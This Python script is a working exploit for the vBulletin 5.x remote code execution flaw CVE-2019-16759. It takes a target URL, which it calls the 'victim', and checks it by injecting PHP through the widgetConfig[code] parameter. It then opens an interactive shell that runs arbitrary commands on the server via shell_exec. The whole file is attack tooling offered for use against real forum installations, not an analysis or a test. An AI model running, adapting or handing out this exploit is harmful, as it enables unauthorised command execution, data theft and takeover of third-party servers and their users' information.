import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# vBulletin 5.x through 5.5.4 allows 
# remote command execution via the widgetConfig[code] 
# parameter in an ajax/render/widget_php routestring request.
class CVE2019_16759:

    def __init__(self, url):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.session = requests.Session()

    def is_vuln(self):
        print (LogColors.BLUE + "check..." + LogColors.ENDC)
        data = {
            "routestring" : "ajax/render/widget_php",
            "widgetConfig[code]" : "echo 'hacked :)'; exit;"
        }
        r = self.session.post(self.url, data = data, verify = False)
        if r.ok:
            if 'hacked :)' in r.text.decode("latin1"):
                print (LogColors.GREEN + "is vulnerable :)" + LogColors.ENDC)
                return True
        else:
            print (LogColors.RED + "not vulnerable :(" + LogColors.ENDC)
        return False

    # exploitation
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        while True:
            cmd = input("$ ")
            if cmd == 'exit':
                sys.exit()
            else:
                data = {
                    "routestring" : "ajax/render/widget_php",
                    "widgetConfig[code]" : "echo shell_exec('" + cmd +"'); exit;"
                }
            r = self.session.post(self.url, data = data, verify = False)
            if r.ok:
                print (LogColors.YELLOW + r.text + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed :(" + LogColors.ENDC)
                sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target vBulletin url")
    args = vars(parser.parse_args())
    cve = CVE2019_16759(args['url'])
    if cve.is_vuln():
        cve.exploit()

